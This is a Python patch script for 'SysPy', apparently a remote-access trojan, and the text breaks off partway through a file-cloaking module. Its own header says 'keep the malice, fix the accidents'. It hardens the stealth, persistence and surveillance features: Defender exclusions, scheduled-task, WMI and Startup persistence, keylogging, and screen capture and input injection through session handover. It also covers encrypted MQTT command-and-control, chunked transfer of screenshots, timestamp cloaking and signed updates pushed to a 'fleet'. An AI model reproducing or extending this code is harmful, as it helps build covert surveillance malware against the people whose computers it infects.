#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
patch.py -- SysPy hardening patch (FIX_PLAN v2: "keep the malice, fix the accidents")

Applies every fix from the audit. Nothing stealthy, persistent, surveilling,
injecting or spreading is removed -- only made more robust, more observable and
more revertible.

Usage
    python patch.py                 apply
    python patch.py --dry-run       report what would change, touch nothing
    python patch.py --check         verify the tree looks patched
    python patch.py --genkey        mint an Ed25519 signing keypair
    python patch.py --verify        run the regression tests afterwards
    python patch.py --no-backup     skip the safety copy

Run from the repository root (the folder holding agent.py / controller.py).
Every edit is anchored; if an anchor is missing the file is listed as FAILED and
left untouched so you can see exactly what drifted.

What it fixes
    W1  passphrase no longer lands on a command line / in task definitions
    W2  Ed25519 signature + HMAC integrity on every kit and update path
    W3  key separation (k_enc / k_mac), 12-byte nonce, versioned envelope
    W4  version + algorithm + key-id header on the wire
    W5  no silent master-key fallback
    W6  topic id is authoritative over the claimed id
    W7  namespaced mutex/lock so two rooms coexist on one host
    W8  persistent data dir, password printed only when generated
    C1  QoS-1 retransmit accepted (replay filter moved off the chunk path)
    C2  session-0 agents hand over to the interactive session (desktop works)
    C3  malformed MQTT PUBLISH can no longer kill the read loop
    C4  Defender exclusions recorded, applied to every copy, and reverted
    C5  Defender prior state snapshotted and restored
    C6  update swap is per-directory, elevation-aware, and rolls back
    C7  compileall no longer leaves .pyc behind
    C8  bootstrap --kit <loose dir> works
    C9  Startup-folder .vbs is removed on uninstall
    C10 received-file URLs survive an agent being deleted
    C11 updates run off the read thread, under a lock, with a goodbye
    S1  CSP + HSTS + hardened file serving
    S2  served files can no longer XSS the controller origin
    S3  Secure cookie, per-token revocation
    S4  proxy-aware login rate limiting
    S5  Host allowlist for installer URLs
    O1  sequence numbers, ws_drop counter, SUBACK handling
    O2  async chunked sends with a deadline
    O3  bounded reassembler (chunks, transfers, bytes)
    O4  cacheable kit endpoint
    H1  purge leaves nothing behind
    H2  one version, one protocol version, a real build id
    H3  deploy.json source is logged
    H4  cloak randomises timestamps instead of stamping one fixed date
    H5  ACL hardening runs once, from one place, quietly
    H6  the EdgeUpdate copy is cloaked selectively
    H7  LAN beacon + kit server authenticate what they can
    H8  non-Windows keylogger backend
    H9  graceful shutdown instead of bare os._exit
    UAC exactly one elevation source; autostart vectors never prompt
"""

from __future__ import annotations

import argparse
import os
import re
import shutil
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
DRY = False
BACKUP = True

CREATED: list[str] = []
REWRITTEN: list[str] = []
EDITED: list[str] = []
SKIPPED: list[str] = []
FAILED: list[str] = []
TOUCHED: set[str] = set()

VERSION = "5.2.0"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def P(*parts: str) -> str:
    return os.path.join(ROOT, *parts)


_NEWLINE: dict[str, str] = {}
_DRY_TEXT: dict[str, str] = {}
TREE_NEWLINE = "\n"


def _detect_newline(text: str) -> str:
    """Dominant line ending in text."""
    crlf = text.count("\r\n")
    lf = text.count("\n") - crlf
    return "\r\n" if crlf > lf else "\n"


def read(path: str) -> str:
    """Read a file, normalising CRLF/LF so anchors only ever use \n.

    This is why 67 of 69 anchors failed on the first run: the checkout is CRLF,
    every multi-line anchor here is LF, and newline="" preserved the difference.
    """
    if DRY and path in _DRY_TEXT:
        return _DRY_TEXT[path]
    with open(path, "r", encoding="utf-8", newline="") as fh:
        raw = fh.read()
    _NEWLINE.setdefault(path, _detect_newline(raw))
    return raw.replace("\r\n", "\n").replace("\r", "\n")


def _record(kind: str, path: str) -> None:
    rel = os.path.relpath(path, ROOT).replace(os.sep, "/")
    TOUCHED.add(path)
    if kind == "created":
        CREATED.append(rel)
    elif kind == "rewritten":
        REWRITTEN.append(rel)
    elif kind == "edited":
        if rel not in EDITED:
            EDITED.append(rel)


def write_raw(path: str, text: str) -> None:
    if DRY:
        _DRY_TEXT[path] = text
        return
    os.makedirs(os.path.dirname(path) or ROOT, exist_ok=True)
    newline = _NEWLINE.setdefault(path, TREE_NEWLINE)
    with open(path, "w", encoding="utf-8", newline="") as fh:
        fh.write(text if newline == "\n" else text.replace("\n", "\r\n"))


def create(path: str, text: str) -> None:
    """Create or overwrite a whole file."""
    existed = os.path.exists(path)
    _record("rewritten" if existed else "created", path)
    write_raw(path, text)


def sub(path: str, old: str, new: str, count: int = 1,
        required: bool = True, label: str = "") -> bool:
    """Replace one anchored fragment. Returns True when applied."""
    rel = os.path.relpath(path, ROOT).replace(os.sep, "/")
    if not os.path.exists(path):
        FAILED.append(f"{rel}: file missing ({label or old[:40]!r})")
        return False
    body = read(path)
    if new and new in body:
        SKIPPED.append(f"{rel}: already applied ({old[:40]!r})")
        return True
    if old not in body:
        if new and new in body:
            SKIPPED.append(f"{rel}: already applied ({label or old[:40]!r})")
            return True
        if required:
            FAILED.append(f"{rel}: anchor not found {label or old[:60]!r}")
        else:
            SKIPPED.append(f"{rel}: {label or old[:40]!r}")
        return False
    if body.count(old) > count and count == 1:
        # still fine, replace first occurrence only
        pass
    write_raw(path, body.replace(old, new, count))
    _record("edited", path)
    return True


def sub_all(path: str, old: str, new: str, required: bool = True,
            label: str = "") -> bool:
    rel = os.path.relpath(path, ROOT).replace(os.sep, "/")
    if not os.path.exists(path):
        FAILED.append(f"{rel}: file missing")
        return False
    body = read(path)
    if old not in body:
        if new and new in body:
            SKIPPED.append(f"{rel}: already applied ({label or old[:40]!r})")
            return True
        if required:
            FAILED.append(f"{rel}: anchor not found {label or old[:60]!r}")
        else:
            SKIPPED.append(f"{rel}: {label or old[:40]!r}")
        return False
    write_raw(path, body.replace(old, new))
    _record("edited", path)
    return True


def rx(path: str, pattern: str, repl: str, count: int = 1,
       required: bool = True, flags: int = re.MULTILINE | re.DOTALL,
       label: str = "") -> bool:
    rel = os.path.relpath(path, ROOT).replace(os.sep, "/")
    if not os.path.exists(path):
        FAILED.append(f"{rel}: file missing")
        return False
    body = read(path)
    new_body, n = re.subn(pattern, repl, body, count=count, flags=flags)
    if n == 0:
        if repl and repl in body:
            SKIPPED.append(f"{rel}: already applied ({label or pattern[:40]!r})")
            return True
        if required:
            FAILED.append(f"{rel}: regex not matched {label or pattern[:60]!r}")
        else:
            SKIPPED.append(f"{rel}: {label or pattern[:40]!r}")
        return False
    write_raw(path, new_body)
    _record("edited", path)
    return True


def append(path: str, text: str) -> None:
    """Append, unless the text is already there."""
    body = read(path) if os.path.exists(path) else ""
    if text.strip() and text.strip() in body:
        SKIPPED.append(
            f"{os.path.relpath(path, ROOT).replace(os.sep, '/')}: already appended")
        return
    write_raw(path, body + text)
    _record("edited", path)


def dedupe_between(path: str, start_marker: str, end_marker: str) -> bool:
    """Delete the second and later copies of a marker-delimited block.

    A sub whose anchor is a prefix of its own replacement (KEY_SALT,
    build_zip_from_dir) re-inserts the block on every run, and append() is
    unconditional. That left config.py and packaging.py holding two copies.
    """
    lines = read(path).split("\n")
    starts = [i for i, line in enumerate(lines) if start_marker in line]
    if len(starts) < 2:
        return False
    cut = starts[1]
    end = None
    for index in range(cut, len(lines)):
        if end_marker in lines[index]:
            end = index
            break
    if end is None:
        return False

    head = lines[:cut]
    tail = lines[end + 1:]
    while head and not head[-1].strip():
        head.pop()
    while tail and not tail[0].strip():
        tail.pop(0)
    out = head + (["", ""] + tail if tail else [])
    while out and not out[-1].strip():
        out.pop()
    write_raw(path, "\n".join(out) + "\n")
    _record("edited", path)
    return True


def backup_tree() -> str:
    stamp = time.strftime("%Y%m%d-%H%M%S")
    target = P(f"_patch_backup_{stamp}")
    if DRY:
        return target
    shutil.copytree(
        ROOT, target,
        ignore=shutil.ignore_patterns(".git", "__pycache__", "*.pyc",
                                      "_patch_backup_*", "data", "*.zip"),
        dirs_exist_ok=True,
    )
    return target


# ---------------------------------------------------------------------------
# new file: syspy/ed25519.py
# ---------------------------------------------------------------------------

ED25519 = r'''"""Ed25519 (RFC 8032) in pure Python -- no dependencies, verify + sign.

Small and slow-ish (~25 ms per verify) but the agent has to run where nothing is
installed, and a signature is the only thing that turns "anyone who learns the
passphrase can push code to my fleet" into "anyone who learns the passphrase can
read my traffic".

Ported from the well-known compact reference implementation.
"""

from __future__ import annotations

import hashlib

P = 2 ** 255 - 19
Q = 2 ** 252 + 27742317777372353535851937790883648493


def _inv(x: int) -> int:
    return pow(x % P, P - 2, P)


_d = (-121665 * _inv(121666)) % P
_I = pow(2, (P - 1) // 4, P)

_By = 4 * _inv(5) % P
_Bx = _xrecover(_By) if False else 0  # replaced below


def _xrecover(y: int) -> int:
    xx = (y * y - 1) * _inv(_d * y * y + 1)
    x = pow(xx, (P + 3) // 8, P)
    if (x * x - xx) % P != 0:
        x = (x * _I) % P
    if x % 2 != 0:
        x = P - x
    return x


_By = 4 * _inv(5) % P
_Bx = _xrecover(_By)
_B = (_Bx, _By)
_IDENTITY = (0, 1)


def _sha512(data: bytes) -> bytes:
    return hashlib.sha512(data).digest()


def _sha512_modq(data: bytes) -> int:
    return int.from_bytes(_sha512(data), "little") % Q


def _add(p1, p2):
    x1, y1 = p1
    x2, y2 = p2
    k = _d * x1 * x2 * y1 * y2
    x3 = (x1 * y2 + x2 * y1) * _inv(1 + k)
    y3 = (y1 * y2 + x1 * x2) * _inv(1 - k)
    return (x3 % P, y3 % P)


def _mul(s: int, point):
    result = _IDENTITY
    while s > 0:
        if s & 1:
            result = _add(result, point)
        point = _add(point, point)
        s >>= 1
    return result


def _encode(point) -> bytes:
    x, y = point
    bits = y | ((x & 1) << 255)
    return bits.to_bytes(32, "little")


def _decode(blob: bytes):
    if len(blob) != 32:
        raise ValueError("bad point length")
    raw = int.from_bytes(blob, "little")
    y = raw & ((1 << 255) - 1)
    if y >= P:
        raise ValueError("y out of range")
    x = _xrecover(y)
    if (x & 1) != ((raw >> 255) & 1):
        x = P - x
    return (x, y)


def _clamped_scalar(seed: bytes) -> int:
    digest = _sha512(seed)
    return 2 ** 254 + sum(
        2 ** i * ((digest[i // 8] >> (i % 8)) & 1) for i in range(3, 254)
    )


def publickey(seed: bytes) -> bytes:
    """32-byte public key for a 32-byte seed."""
    if len(seed) != 32:
        raise ValueError("seed must be 32 bytes")
    return _encode(_mul(_clamped_scalar(seed), _B))


def sign(message: bytes, seed: bytes) -> bytes:
    """64-byte detached signature."""
    if len(seed) != 32:
        raise ValueError("seed must be 32 bytes")
    digest = _sha512(seed)
    a = _clamped_scalar(seed)
    r = _sha512_modq(digest[32:] + message)
    big_r = _mul(r, _B)
    hram = _sha512_modq(_encode(big_r) + publickey(seed) + message)
    s = (r + hram * a) % Q
    return _encode(big_r) + s.to_bytes(32, "little")


def verify(signature: bytes, message: bytes, public: bytes) -> bool:
    """True when ``signature`` is valid for ``message`` under ``public``."""
    try:
        if len(signature) != 64 or len(public) != 32:
            return False
        r_bytes = signature[:32]
        s = int.from_bytes(signature[32:], "little")
        if s >= Q:
            return False
        a_point = _decode(public)
        r_point = _decode(r_bytes)
        h = _sha512_modq(r_bytes + public + message)
        return _add(r_point, _mul(h, a_point)) == _mul(s, _B)
    except Exception:
        return False


def seed_from_hex(text: str) -> bytes:
    raw = bytes.fromhex(text.strip())
    if len(raw) != 32:
        raise ValueError("seed hex must be 64 characters")
    return raw
'''


# ---------------------------------------------------------------------------
# new file: syspy/agent/machine_state.py
# ---------------------------------------------------------------------------

MACHINE_STATE = r'''"""Record of every machine-wide change the agent makes.

This is the answer to "make the covert stuff declared without removing it".
Defender exclusions, ACL grants, registry values, scheduled tasks, the WMI
consumer and the Startup entry all get written down here, so ``purge`` can undo
exactly what we did -- and nothing else -- and ``persist.report`` can tell the
operator which of the seven vectors this install actually created.
"""

from __future__ import annotations

import json
import os
import threading
import time

_LOCK = threading.Lock()
_CACHE: dict | None = None


def _path() -> str:
    try:
        from . import stealth
        base = stealth.primary_directory()
    except Exception:
        from .. import config
        base = config.ROOT
    try:
        os.makedirs(base, exist_ok=True)
    except OSError:
        import tempfile
        base = tempfile.gettempdir()
    return os.path.join(base, "machine-state.json")


def load() -> dict:
    global _CACHE
    if _CACHE is not None:
        return _CACHE
    try:
        with open(_path(), "r", encoding="utf-8") as handle:
            data = json.load(handle)
        _CACHE = data if isinstance(data, dict) else {}
    except Exception:
        _CACHE = {}
    _CACHE.setdefault("created_at", int(time.time()))
    return _CACHE


def save() -> None:
    data = load()
    data["updated_at"] = int(time.time())
    path = _path()
    tmp = path + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as handle:
            json.dump(data, handle, indent=1)
        os.replace(tmp, path)
    except OSError:
        pass


def record(section: str, key: str, value) -> None:
    """Idempotent: writing the same value twice is a no-op."""
    with _LOCK:
        bucket = load().setdefault(section, {})
        if bucket.get(key) == value:
            return
        bucket[key] = value
        save()


def forget(section: str, key: str = "") -> None:
    with _LOCK:
        data = load()
        if not key:
            data.pop(section, None)
        else:
            data.get(section, {}).pop(key, None)
        save()


def get(section: str) -> dict:
    with _LOCK:
        return dict(load().get(section) or {})


def summary() -> dict:
    data = dict(load())
    return {k: (len(v) if isinstance(v, dict) else v) for k, v in data.items()}
'''


# ---------------------------------------------------------------------------
# new file: syspy/agent/session.py
# ---------------------------------------------------------------------------

SESSION = r'''"""Windows session awareness.

A WMI consumer and the ``/RU SYSTEM`` boot task both land in session 0, where
there is no interactive desktop: no screen capture, no input injection, no
foreground window. The interactive ONLOGON task is the only vector that has a
desktop.

So: a headless agent hands over to the interactive task as soon as a user logs
on, and the watchdog is the single place that decides *which* tier should be
running. Exactly one agent exists at a time; it is the interactive one whenever
a user is present.
"""

from __future__ import annotations

import ctypes
import os
import subprocess
import time

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0

_CONSOLE_NONE = 0xFFFFFFFF
WTS_CURRENT_SERVER_HANDLE = 0
WTS_USERNAME = 5


def session_of(pid: int) -> int:
    """Session id owning ``pid``; -1 when unknown."""
    if not IS_WINDOWS:
        return -1
    try:
        value = ctypes.c_ulong(0)
        ok = ctypes.windll.kernel32.ProcessIdToSessionId(
            ctypes.c_ulong(pid), ctypes.byref(value))
        return int(value.value) if ok else -1
    except Exception:
        return -1


def current_session() -> int:
    return session_of(os.getpid())


def is_headless() -> bool:
    """True when this process has no interactive desktop."""
    if not IS_WINDOWS:
        return False
    session = current_session()
    return session == 0


def console_session() -> int:
    """Session id of the physical console, or 0 when nobody is logged on."""
    if not IS_WINDOWS:
        return 1
    try:
        value = ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
        return int(value) if value != _CONSOLE_NONE else 0
    except Exception:
        return 0


def user_session_active() -> bool:
    """True when a human is logged on at the console."""
    if not IS_WINDOWS:
        return True
    return console_session() > 0


def console_user() -> str:
    """User name of the console session, or '' when unknown."""
    if not IS_WINDOWS:
        return os.environ.get("USER", "")
    session = console_session()
    if session <= 0:
        return ""
    buffer = ctypes.c_wchar_p()
    returned = ctypes.c_ulong(0)
    try:
        ok = ctypes.windll.wtsapi32.WTSQuerySessionInformationW(
            WTS_CURRENT_SERVER_HANDLE, session, WTS_USERNAME,
            ctypes.byref(buffer), ctypes.byref(returned))
        if not ok or not buffer.value:
            return ""
        return str(buffer.value)
    except Exception:
        return ""
    finally:
        try:
            ctypes.windll.wtsapi32.WTSFreeMemory(buffer)
        except Exception:
            pass


def task_exists(name: str) -> bool:
    if not IS_WINDOWS:
        return False
    try:
        from .. import config
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", name],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
        return result.returncode == 0
    except Exception:
        return False


def run_task(name: str) -> bool:
    if not IS_WINDOWS:
        return False
    try:
        result = subprocess.run(
            ["schtasks", "/Run", "/TN", name],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
        return result.returncode == 0
    except Exception:
        return False


def should_yield() -> bool:
    """A headless agent with a logged-on user and a live logon task: yield."""
    if not IS_WINDOWS or not is_headless():
        return False
    if os.environ.get("SYSPY_NO_YIELD") == "1":
        return False
    if not user_session_active():
        return False
    from .. import config
    return task_exists(config.TASK_NAME)


def yield_to_interactive(wait: float = 20.0) -> bool:
    """Ask the interactive task to take over. True when it did."""
    from .. import config
    if not run_task(config.TASK_NAME):
        return False
    deadline = time.time() + wait
    while time.time() < deadline:
        time.sleep(0.5)
        try:
            from . import stealth
            owner = stealth.read_pid(stealth.lock_path())
            if owner and owner != os.getpid() and stealth.process_alive(owner):
                if session_of(owner) > 0:
                    return True
        except Exception:
            pass
    return False
'''


# ---------------------------------------------------------------------------
# crypto.py -- full rewrite (W3, W4)
# ---------------------------------------------------------------------------

CRYPTO = r'''"""Authenticated encryption built from :mod:`hashlib` alone.

Two envelope formats live here.

**v2 (what this build writes).**  A versioned, self-describing header, a 12-byte
nonce, and *separate* encryption and authentication subkeys derived by
HKDF-Expand::

    "S2" | alg(1) | keyid(4) | nonce(12) | ciphertext(n) | tag(32)

The header is covered by the MAC, so ``alg`` and ``keyid`` cannot be flipped.
``keyid`` is ``SHA-256(key)[:4]`` and exists so a receiver can tell which key a
packet belongs to instead of guessing.

**v1 (legacy, still readable).**  ``nonce(8) | ciphertext | tag`` with one key
for both jobs. Kept so a patched controller and an unpatched agent interoperate
in both directions with no flag day.

``unseal`` auto-detects: it tries v2, and falls back to legacy when the v2 parse
fails. This is not a security downgrade -- a tampered v2 blob fails both.

This is still not AES-GCM. The agent runs where nothing is installed, so a
maintained AE library means vendoring one. What v2 fixes relative to v1 is the
real problem: no version marker, no algorithm marker, no key identity, an 8-byte
nonce, and one key doing two jobs.
"""

from __future__ import annotations

import hashlib
import hmac
import os
import struct
import threading
from collections import deque

MAGIC = b"S2"
ALG_LEGACY = 0
ALG_CTR_HMAC = 1
HDR_SIZE = len(MAGIC) + 1 + 4

NONCE_SIZE_LEGACY = 8
NONCE_SIZE = 12
TAG_SIZE = 32
KEY_SIZE = 32

#: Envelope format written by :func:`seal` unless told otherwise.
CURRENT_FMT = 2

_ENC_INFO = b"syspy/v2/enc"
_MAC_INFO = b"syspy/v2/mac"


def derive_key(passphrase: str, salt: bytes = b"", iterations: int = 60_000) -> bytes:
    """Stretch a passphrase into a 32-byte key."""
    return hashlib.pbkdf2_hmac(
        "sha256", passphrase.encode("utf-8"), salt, iterations, dklen=KEY_SIZE
    )


def subkey(master_key: bytes, context) -> bytes:
    """HKDF-Expand (RFC 5869) over HMAC-SHA-256 for a purpose- or peer-specific key."""
    info = context.encode("utf-8") if isinstance(context, str) else context
    return hmac.new(master_key, info + b"\x01", hashlib.sha256).digest()[:KEY_SIZE]


def key_id(key: bytes) -> bytes:
    """4-byte public fingerprint of ``key``."""
    return hashlib.sha256(key).digest()[:4]


def _enc_key(key: bytes) -> bytes:
    return subkey(key, _ENC_INFO)


def _mac_key(key: bytes) -> bytes:
    return subkey(key, _MAC_INFO)


def _keystream(key: bytes, nonce: bytes, length: int) -> bytes:
    blocks = (length + 31) // 32
    out = bytearray()
    for counter in range(blocks):
        out += hashlib.sha256(key + nonce + struct.pack(">I", counter)).digest()
    return bytes(out[:length])


def _xor(data: bytes, stream: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(data, stream))


# --------------------------------------------------------------------------- seal

def seal(key: bytes, plaintext: bytes, fmt: int = CURRENT_FMT) -> bytes:
    """Encrypt and authenticate ``plaintext``."""
    if fmt < 2:
        return _seal_legacy(key, plaintext)

    nonce = os.urandom(NONCE_SIZE)
    header = MAGIC + bytes([ALG_CTR_HMAC]) + key_id(key)
    ciphertext = _xor(plaintext, _keystream(_enc_key(key), nonce, len(plaintext)))
    tag = hmac.new(_mac_key(key), header + nonce + ciphertext, hashlib.sha256).digest()
    return header + nonce + ciphertext + tag


def _seal_legacy(key: bytes, plaintext: bytes) -> bytes:
    nonce = os.urandom(NONCE_SIZE_LEGACY)
    ciphertext = _xor(plaintext, _keystream(key, nonce, len(plaintext)))
    tag = hmac.new(key, nonce + ciphertext, hashlib.sha256).digest()
    return nonce + ciphertext + tag


# ------------------------------------------------------------------------- unseal

def _looks_v2(blob: bytes) -> bool:
    return blob[:len(MAGIC)] == MAGIC and len(blob) >= HDR_SIZE + NONCE_SIZE + TAG_SIZE


def nonce_span(blob: bytes) -> tuple[int, int]:
    """Byte range of the nonce, for whichever format ``blob`` uses."""
    if _looks_v2(blob):
        return HDR_SIZE, HDR_SIZE + NONCE_SIZE
    return 0, NONCE_SIZE_LEGACY


def header_of(blob: bytes) -> tuple[int, bytes]:
    """``(algorithm, key_id)``; ``(ALG_LEGACY, b"")`` for a legacy blob."""
    if _looks_v2(blob):
        return blob[len(MAGIC)], blob[len(MAGIC) + 1:HDR_SIZE]
    return ALG_LEGACY, b""


def unseal(key: bytes, blob: bytes) -> bytes:
    """Verify and decrypt. Raises ``ValueError`` on any failure."""
    if _looks_v2(blob):
        try:
            return _unseal_v2(key, blob)
        except ValueError as error:
            # A legacy blob whose random nonce happens to start with "S2"
            # lands here. Retry legacy before giving up.
            try:
                return _unseal_legacy(key, blob)
            except ValueError:
                raise error
    return _unseal_legacy(key, blob)


def _unseal_v2(key: bytes, blob: bytes) -> bytes:
    if len(blob) < HDR_SIZE + NONCE_SIZE + TAG_SIZE:
        raise ValueError("blob too short")
    if blob[:len(MAGIC)] != MAGIC:
        raise ValueError("bad magic")
    alg = blob[len(MAGIC)]
    if alg != ALG_CTR_HMAC:
        raise ValueError(f"unsupported algorithm {alg}")
    header = blob[:HDR_SIZE]
    nonce = blob[HDR_SIZE:HDR_SIZE + NONCE_SIZE]
    ciphertext = blob[HDR_SIZE + NONCE_SIZE:-TAG_SIZE]
    tag = blob[-TAG_SIZE:]
    expected = hmac.new(_mac_key(key), header + nonce + ciphertext,
                        hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        raise ValueError("authentication failed")
    return _xor(ciphertext, _keystream(_enc_key(key), nonce, len(ciphertext)))


def _unseal_legacy(key: bytes, blob: bytes) -> bytes:
    if len(blob) < NONCE_SIZE_LEGACY + TAG_SIZE:
        raise ValueError("blob too short")
    nonce = blob[:NONCE_SIZE_LEGACY]
    ciphertext = blob[NONCE_SIZE_LEGACY:-TAG_SIZE]
    tag = blob[-TAG_SIZE:]
    expected = hmac.new(key, nonce + ciphertext, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        raise ValueError("authentication failed")
    return _xor(ciphertext, _keystream(key, nonce, len(ciphertext)))


# ------------------------------------------------------------------ kit signing

def kit_hmac_key(room: str, passphrase: str) -> bytes:
    """Symmetric integrity key for kit/update payloads.

    Used where an Ed25519 verifier is not available (PowerShell 5.1 has no
    Ed25519). Catches a LAN MITM and a tampered archive; does *not* stop someone
    who knows the passphrase, which is what the pinned public key is for.
    """
    return hashlib.sha256(
        ("syspy/kit/v1|" + room + "|" + passphrase).encode("utf-8")
    ).digest()


def hmac_hex(key: bytes, payload: bytes) -> str:
    return hmac.new(key, payload, hashlib.sha256).hexdigest()


def verify_signature(payload: bytes, signature_hex: str, public_hex: str,
                     hmac_key: bytes = b"") -> tuple[bool, str]:
    """Check a payload against a pinned Ed25519 key, else an HMAC.

    Returns ``(ok, how)``. Fails closed: a pinned key that is present but does
    not verify is a failure, never a silent fall back to HMAC.
    """
    if public_hex:
        try:
            from . import ed25519
            public = bytes.fromhex(public_hex)
            if len(public) != 32:
                return False, "pinned public key is not 32 bytes"
            if not signature_hex:
                return False, "no signature supplied"
            if ed25519.verify(bytes.fromhex(signature_hex), payload, public):
                return True, "ed25519"
            return False, "ed25519 signature mismatch"
        except Exception as error:
            return False, f"ed25519 verify error: {error}"

    if hmac_key:
        digest = hmac_hex(hmac_key, payload)
        if hmac.compare_digest(digest, (signature_hex or "").lower()):
            return True, "hmac"
        return False, "hmac mismatch"

    return True, "unverified"


# ------------------------------------------------------------------- replay

class ReplayFilter:
    """Remembers recently seen nonces so replayed packets are dropped."""

    def __init__(self, capacity: int = 1024) -> None:
        self._capacity = capacity
        self._seen: set[bytes] = set()
        self._order: deque[bytes] = deque()
        self._lock = threading.Lock()

    def check(self, nonce: bytes) -> bool:
        """True when ``nonce`` is new, False when it is a replay."""
        with self._lock:
            if nonce in self._seen:
                return False
            self._seen.add(nonce)
            self._order.append(nonce)
            while len(self._order) > self._capacity:
                self._seen.discard(self._order.popleft())
            return True

    def reset(self) -> None:
        with self._lock:
            self._seen.clear()
            self._order.clear()
'''


# ---------------------------------------------------------------------------
# protocol.py -- full rewrite (W4, C1, O3)
# ---------------------------------------------------------------------------

PROTOCOL = r'''"""Message framing on top of :mod:`syspy.crypto`.

Every packet on the wire is a sealed JSON document. Large payloads are split
into chunks that are reassembled on the far side, so a 3 MB screenshot travels
over a public MQTT broker without any broker-specific configuration.

Two things changed in this revision.

**Format negotiation.** ``Codec`` carries the envelope format it writes. A v2
controller speaks v2 to a v2 agent and v1 to a v1 agent, decided per peer from
the ``fmt`` field in its hello. Decoding always auto-detects, so nothing has to
be migrated in lockstep.

**QoS-1 retransmits work.** A retried publish is byte-identical, so its nonce is
already in the replay filter. Rejecting it outright silently defeated every
retry. ``decode_message`` therefore treats a replay as "already seen": harmless
for a chunk (the reassembler dedups by index anyway) and dropped for a logical
message.
"""

from __future__ import annotations

import base64
import json
import threading
import zlib
from typing import Any, Optional

from . import config
from .crypto import ReplayFilter, nonce_span, seal, unseal

#: Guard rails. All three were previously unbounded.
MAX_TOTAL_CHUNKS = 20_000
MAX_LIVE_TRANSFERS = 64
MAX_AGGREGATE_BYTES = 512 * 1024 * 1024
MAX_DECOMPRESSED = 256 * 1024 * 1024

REASON_OK = "ok"
REASON_REPLAY = "replay"
REASON_BAD = "bad"


class Codec:
    """Encodes and decodes sealed protocol messages."""

    def __init__(self, key: bytes, replay_capacity: int = 1024, fmt: int = 2) -> None:
        self._key = key
        self._fmt = fmt
        self._replay = ReplayFilter(replay_capacity)

    @property
    def fmt(self) -> int:
        return self._fmt

    def encode(self, message: dict[str, Any]) -> bytes:
        raw = json.dumps(message, separators=(",", ":")).encode("utf-8")
        return seal(self._key, raw, fmt=self._fmt)

    def decode(self, blob: bytes, allow_replay: bool = False) -> dict[str, Any]:
        """Verify, decrypt and deserialise. Raises ``ValueError`` on failure."""
        raw = unseal(self._key, blob)
        start, end = nonce_span(blob)
        if not allow_replay and not self._replay.check(blob[start:end]):
            raise ValueError("replayed packet")
        return json.loads(raw.decode("utf-8"))

    def decode_message(self, blob: bytes) -> tuple[Optional[dict[str, Any]], str]:
        """Chunk-aware decode.

        Returns ``(message, REASON_OK)``, ``(None, REASON_REPLAY)`` for a
        duplicate that has already been handled, or ``(None, REASON_BAD)``.
        """
        try:
            return self.decode(blob), REASON_OK
        except ValueError as error:
            if "replayed" not in str(error):
                return None, REASON_BAD
        try:
            message = self.decode(blob, allow_replay=True)
        except ValueError:
            return None, REASON_BAD
        if "xid" in message:
            return message, REASON_OK          # QoS-1 redelivery of a chunk
        return None, REASON_REPLAY             # duplicate logical message


class Reassembler:
    """Collects chunked payloads and returns them once complete."""

    def __init__(self, timeout: float = 120.0) -> None:
        self._timeout = timeout
        self._parts: dict[str, dict[int, bytes]] = {}
        self._meta: dict[str, tuple[int, float]] = {}
        self._bytes = 0
        self._lock = threading.Lock()
        self.dropped = 0

    def feed(self, message: dict[str, Any], now: float) -> Optional[bytes]:
        """Add a chunk. Returns the full payload when the last chunk arrives."""
        transfer = str(message.get("xid") or "")
        try:
            total = int(message.get("total") or 1)
            index = int(message.get("part") or 0)
        except (TypeError, ValueError):
            return None
        if not transfer or total < 1 or total > MAX_TOTAL_CHUNKS:
            return None
        if not 0 <= index < total:
            return None

        try:
            decoded = base64.b64decode(message.get("data") or "")
        except Exception:
            return None

        with self._lock:
            self._expire(now)
            if transfer not in self._parts and len(self._parts) >= MAX_LIVE_TRANSFERS:
                self.dropped += 1
                return None
            if self._bytes + len(decoded) > MAX_AGGREGATE_BYTES:
                self._parts.pop(transfer, None)
                self._meta.pop(transfer, None)
                self.dropped += 1
                return None

            bucket = self._parts.setdefault(transfer, {})
            if index in bucket:                 # QoS-1 redelivery
                return None
            bucket[index] = decoded
            self._bytes += len(decoded)
            self._meta[transfer] = (total, now)

            if len(bucket) < total:
                return None

            data = b"".join(bucket[i] for i in range(total) if i in bucket)
            self._bytes -= sum(len(part) for part in bucket.values())
            self._parts.pop(transfer, None)
            self._meta.pop(transfer, None)

        if message.get("z"):
            try:
                data = zlib.decompressobj().decompress(data, MAX_DECOMPRESSED)
            except zlib.error:
                pass
        return data

    def _expire(self, now: float) -> None:
        stale = [k for k, (_, seen) in self._meta.items() if now - seen > self._timeout]
        for key in stale:
            bucket = self._parts.pop(key, None) or {}
            self._bytes -= sum(len(part) for part in bucket.values())
            self._meta.pop(key, None)

    def progress(self, message: dict[str, Any]) -> tuple[int, int]:
        transfer = str(message.get("xid") or "")
        try:
            total = int(message.get("total") or 1)
        except (TypeError, ValueError):
            total = 1
        with self._lock:
            received = len(self._parts.get(transfer, {}))
        return received, total

    def live(self) -> int:
        with self._lock:
            return len(self._parts)


def chunk(payload: bytes, transfer: str, chunk_size: int = config.CHUNK_SIZE,
          compress: bool = False) -> list[dict[str, Any]]:
    """Split ``payload`` into a list of chunk messages."""
    data = zlib.compress(payload, 6) if compress else payload
    total = max(1, (len(data) + chunk_size - 1) // chunk_size)
    return [
        {
            "xid": transfer,
            "part": index,
            "total": total,
            "data": base64.b64encode(
                data[index * chunk_size:(index + 1) * chunk_size]
            ).decode("ascii"),
            **({"z": 1} if compress else {}),
        }
        for index in range(total)
    ]
'''


# ---------------------------------------------------------------------------
# cloak.py -- full rewrite (H4, H6)
# ---------------------------------------------------------------------------

CLOAK = r'''"""Cloaking: file attributes and timestamp masking for agent artifacts.

Two fixes over the first cut:

* timestamps are scattered inside a plausible window instead of every file
